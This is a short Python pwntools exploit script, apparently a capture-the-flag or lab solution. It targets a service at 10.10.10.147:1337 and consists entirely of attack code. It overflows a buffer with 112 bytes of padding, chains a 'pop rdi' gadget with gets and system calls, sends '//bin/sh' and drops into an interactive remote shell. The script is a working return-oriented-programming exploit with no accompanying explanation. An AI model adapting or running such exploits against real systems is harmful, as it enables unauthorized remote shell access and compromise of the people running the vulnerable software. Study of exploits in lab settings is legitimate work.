from pwn import * 

context (os="linux",arch="amd64")
HOST, PORT = "10.10.10.147", 1337

junk = "A" * 112
rbp = "/bin//sh" #junk

pop_rdi_gadget = p64(0x40120b) # pop rdi ; ret
rdi = p64(0x404048)   # writable mem is 404048
gets = p64(0x401060)
system_mem = p64(0x401040)

print(junk+rbp+pop_rdi_gadget+rdi+gets+system_mem)
p = remote(HOST,PORT)
p.recvline("What do you want me to echo back?")
p.sendline(junk+rbp+pop_rdi_gadget+rdi+gets+system_mem)
p.sendline("//bin/sh")
p.interactive()
